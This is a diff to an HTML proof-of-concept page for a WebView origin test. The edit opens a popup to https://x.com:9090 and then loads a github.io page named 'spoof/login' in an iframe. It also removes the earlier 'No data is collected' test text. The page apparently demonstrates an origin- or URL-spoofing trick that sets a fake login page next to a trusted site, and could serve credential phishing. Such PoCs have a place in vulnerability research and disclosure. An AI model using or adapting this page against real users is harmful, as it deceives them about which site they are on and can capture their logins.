@@ -3,6 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <title>WebView Origin Test PoC</title>
+
 <style>
 body {
   font-family: Arial;
@@ -14,7 +15,15 @@ button {
   padding: 12px 20px;
   font-size: 16px;
 }
+
+iframe {
+  margin-top: 20px;
+  width: 90%;
+  height: 400px;
+  border: 1px solid #ccc;
+}
 </style>
+
 </head>
 
 <body>
@@ -24,10 +33,12 @@ button {
 
 <button onclick="test()">Start Test</button>
 
+<div id="frameContainer"></div>
+
 <script>
 function test() {
 
-  const win = window.open("https://x.com:90");
+  const win = window.open("https://x.com:9090");
 
   if (!win) {
     alert("Popup blocked");
@@ -35,16 +46,23 @@ function test() {
   }
 
   setTimeout(() => {
+
     try {
-      win.document.body.innerHTML = `
-        <h1>Test Content</h1>
-        <p>This page checks WebView rendering behavior.</p>
-        <p>No data is collected.</p>
-      `;
+
+      const iframe = document.createElement("iframe");
+
+      iframe.src = "https://cnfdnfial-ops.github.io/spoof/login";
+      iframe.title = "WebView iframe test";
+
+      document
+        .getElementById("frameContainer")
+        .appendChild(iframe);
+
     } catch (e) {
-      console.log("Cross-origin protection:", e);
+      console.log("Error:", e);
     }
-  }, 2000);
+
+  }, 3000);
 
 }
 </script>
